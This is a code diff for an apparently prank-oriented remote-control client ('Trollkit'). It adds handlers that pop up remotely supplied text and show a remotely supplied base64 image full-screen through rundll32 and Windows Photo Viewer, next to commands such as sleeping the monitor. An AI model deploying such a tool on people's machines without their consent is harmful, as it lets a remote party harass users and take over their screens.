@@ -1,10 +1,12 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
+using System.Windows;
 using Trollkit_Library.Models;
 
 namespace Trollkit_Client.Modules.CommandHandlers
@@ -22,8 +24,10 @@ namespace Trollkit_Client.Modules.CommandHandlers
 					MonitorSleep();
 					break;
 				case "TextBox":
+					TextBox(obj.Value);
 					break;
 				case "ShowImage":
+					ShowImage(obj.Value);
 					break;
 				case "OpenSite":
 					break;
@@ -43,6 +47,46 @@ namespace Trollkit_Client.Modules.CommandHandlers
 		private static IntPtr GetHandle()
 		{
 			return Process.GetCurrentProcess().MainWindowHandle;
+		}
+
+		private void TextBox(string textToDisplay)
+		{
+			MessageBox.Show(textToDisplay);
+		}
+
+		private void ShowImage(string base64Image)
+		{
+			byte[] bytes = Convert.FromBase64String(base64Image);
+
+			var tempFileName = Path.GetTempFileName();
+			System.IO.File.WriteAllBytes(tempFileName, bytes);
+
+			string path = Environment.GetFolderPath(
+				Environment.SpecialFolder.ProgramFiles);
+
+			// create our startup process and argument
+			var psi = new ProcessStartInfo(
+				"rundll32.exe",
+				String.Format(
+					"\"{0}{1}\", ImageView_Fullscreen {2}",
+					Environment.Is64BitOperatingSystem ?
+						path.Replace(" (x86)", "") :
+						path
+						,
+					@"\Windows Photo Viewer\PhotoViewer.dll",
+					tempFileName)
+				);
+
+			psi.UseShellExecute = false;
+
+			var viewer = Process.Start(psi);
+			// cleanup when done...
+			viewer.EnableRaisingEvents = true;
+			viewer.Exited += (o, args) =>
+			{
+				File.Delete(tempFileName);
+			};
+
 		}
 	}
 }
